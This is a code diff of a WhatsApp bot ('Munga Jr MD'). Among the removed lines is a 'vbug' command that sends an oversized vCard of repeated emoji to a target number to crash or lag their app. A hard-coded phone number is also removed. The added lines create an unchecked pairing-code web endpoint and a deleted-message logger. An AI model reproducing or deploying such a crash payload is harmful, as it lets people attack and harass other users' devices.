@@ -1,122 +1,93 @@
-const { 
-    default: makeWASocket, 
-    useMultiFileAuthState, 
-    DisconnectReason, 
-    fetchLatestBaileysVersion, 
+
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    fetchLatestBaileysVersion,
+    makeCacheableSignalKeyStore,
+    DisconnectReason
 } = require("@whiskeysockets/baileys");
-const pino = require('pino');
-const { Boom } = require('@hapi/boom');
-const qrcode = require('qrcode-terminal');
-const axios = require('axios');
+const pino = require("pino");
+const app = require("./server"); 
+const PORT = process.env.PORT || 3000;
 
-const prefix = "."; 
-const ownerNumber = ["255763071896@s.whatsapp.net"]; // CHANGE THIS TO YOUR NUMBER
-
-async function startMungaJrMD() {
+async function startMungaBot() {
     const { state, saveCreds } = await useMultiFileAuthState('MungaSession');
+    
     const sock = makeWASocket({
-    version: (await fetchLatestBaileysVersion()).version,
-    auth: state,
-    logger: pino({ level: 'silent' }),
-    printQRInTerminal: false,
-    browser: ['Chrome (Linux)', 'Chrome', '1.0.0']
-});
+        auth: state,
+        printQRInTerminal: false,
+        logger: pino({ level: "fatal" }),
+        browser: ["Ubuntu", "Chrome", "20.0.04"]
+    });
 
-if (!sock.authState.creds.registered) {
-    const phoneNumber = "255763071896"; 
-    setTimeout(async () => {
-        let code = await sock.requestPairingCode(phoneNumber);
-        console.log(`\n\nKODI YAKO NI: ${code}\n\n`);
-    }, 3000);
-}
-
+    // Endpoint ya kutoa kodi kwenye tovuti ya kijani
+    app.get('/pair', async (req, res) => {
+        let num = req.query.number;
+        if (!num) return res.json({ error: "Weka namba" });
+        try {
+            let code = await sock.requestPairingCode(num);
+            res.json({ code: code });
+        } catch (err) {
+            res.json({ error: "Jaribu tena" });
+        }
+    });
 
     sock.ev.on('creds.update', saveCreds);
-
-    sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        if (qr) qrcode.generate(qr, { small: true });
-        if (connection === 'open') console.log('\n--- MUNGA JR MD IS LIVE ---');
-    });
 
     sock.ev.on('messages.upsert', async m => {
         const msg = m.messages[0];
         if (!msg.message || msg.key.fromMe) return;
-
-        const from = msg.key.remoteJid;
-        const type = Object.keys(msg.message)[0];
-        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (type === 'imageMessage') ? msg.message.imageMessage.caption : '';
-        const isCmd = body.startsWith(prefix);
-        const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
-        const args = body.trim().split(/ +/).slice(1);
-        const text = args.join(" ");
-        const sender = msg.key.participant || msg.key.remoteJid;
-
-        // --- FANCY MENU UI ---
-        if (command === 'menu' || command === 'help') {
-            const neonImage = "https://telegra.ph/file/5a5a1f26a11e1f14300e8.jpg"; 
-            let menuText = `
-╔════════════════════╗
-║    ⚡ **MUNGA-JR-MD** ⚡
-╚════════════════════╝
-👤 **USER:** @${sender.split('@')[0]}
-🛠️ **CREATOR:** Mark Richard
-🔑 **PREFIX:** ${prefix}
-╰════════════════════╝
-
-*『 BUG & CRASH 』☠️*
-☠️ ${prefix}vbug (Number) - Heavy VCard Virus
-🌀 ${prefix}locbug (Number) - Location Lag
-
-*『 DOWNLOADER 』📥*
-📹 ${prefix}tiktok (Link) - Download TikTok
-🎵 ${prefix}ytmp3 (Link) - YouTube Music
-
-*『 AI & UTILS 』🤖*
-🧠 ${prefix}ai (Question) - ChatGPT
-🚀 ${prefix}ping - Check Speed
-👤 ${prefix}owner - Contact Dev
-
-> 💻 Engineered by Munga Tech`;
-
-            await sock.sendMessage(from, { image: { url: neonImage }, caption: menuText, mentions: [sender] });
+        
+        // MFUMO WA ANTIDELETE
+        if (msg.message.protocolMessage && msg.message.protocolMessage.type === 0) {
+            const key = msg.message.protocolMessage.key;
+            console.log(`Meseji imefutwa ID: ${key.id}`);
         }
 
-        // --- API COMMAND LOGIC ---
-        switch (command) {
-            case 'ai':
-                if (!text) return sock.sendMessage(from, { text: "Please ask a question!" });
-                try {
-                    const res = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(text)}&lc=en`);
-                    await sock.sendMessage(from, { text: `🤖 *Munga AI:* ${res.data.success}` });
-                } catch (e) {
-                    await sock.sendMessage(from, { text: "❌ AI Server is busy." });
-                }
-                break;
+        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").toLowerCase();
 
-            case 'tiktok':
-                if (!text) return sock.sendMessage(from, { text: "Send a TikTok link!" });
-                try {
-                    await sock.sendMessage(from, { text: "📥 Downloading TikTok video..." });
-                    const ttRes = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${text}`);
-                    await sock.sendMessage(from, { video: { url: ttRes.data.data.video.noWatermark }, caption: "Done! ✅" });
-                } catch (e) {
-                    await sock.sendMessage(from, { text: "❌ Error downloading video." });
-                }
-                break;
+        // --- MENU YENYE MISTARI MIREFU NA COMMANDS NYINGI ---
+        if (text === '.menu') {
+            const menuText = `
+╔════════════════════════════╗
+║     ✨ MUNGA-JR-MD ✨      ║
+╠════════════════════════════╣
+║ 👤 USER: Mark Richard      ║
+║ 🔑 PREFIX: .               ║
+║ 👑 DEV: Munga Jr Tech      ║
+║ 📊 STATUS: Online          ║
+╠════════════════════════════╣
+║       🚀 DEPLOYMENT        ║
+║ 📁 .deploy  |  📁 .runtime ║
+╠════════════════════════════╣
+║       🛡️ PROTECTION        ║
+║ ✅ .antidelete (Active)    ║
+║ 🚫 .antilink   | 🚫 .kick  ║
+╠════════════════════════════╣
+║       🛠️ UTILITIES         ║
+║ 📁 .status  |  📁 .ping    ║
+║ 📷 .sticker |  🎥 .video   ║
+║ 🎵 .song    |  🔍 .search  ║
+╠════════════════════════════╣
+║    POWERED BY MUNGA TECH   ║
+╚════════════════════════════╝`;
 
-            case 'vbug':
-                if (!text) return sock.sendMessage(from, { text: "Provide target number!" });
-                const vtarget = text + '@s.whatsapp.net';
-                const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Munga Virus ☠️\nitem1.ADR:;;' + "🔥".repeat(15000) + ';;;;\nEND:VCARD';
-                await sock.sendMessage(vtarget, { contacts: { displayName: 'Munga Jr Payload', contacts: [{ vcard }] } });
-                await sock.sendMessage(from, { text: `✅ Attack sent to @${text}!`, mentions: [vtarget] });
-                break;
+            await sock.sendMessage(msg.key.remoteJid, { 
+                image: { url: "https://files.catbox.moe/k3b7z6.jpg" }, 
+                caption: menuText 
+            });
+        }
+    });
 
-            case 'ping':
-                await sock.sendMessage(from, { text: `🚀 *Response:* ${Date.now() - msg.messageTimestamp * 1000} ms` });
-                break;
+    sock.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === 'open') console.log('--- LIVE 🚀 ---');
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            if (shouldReconnect) startMungaBot();
         }
     });
 }
-startMungaJrMD();
+
+startMungaBot();
+app.listen(PORT, () => console.log("Munga Jr MD is running..."));
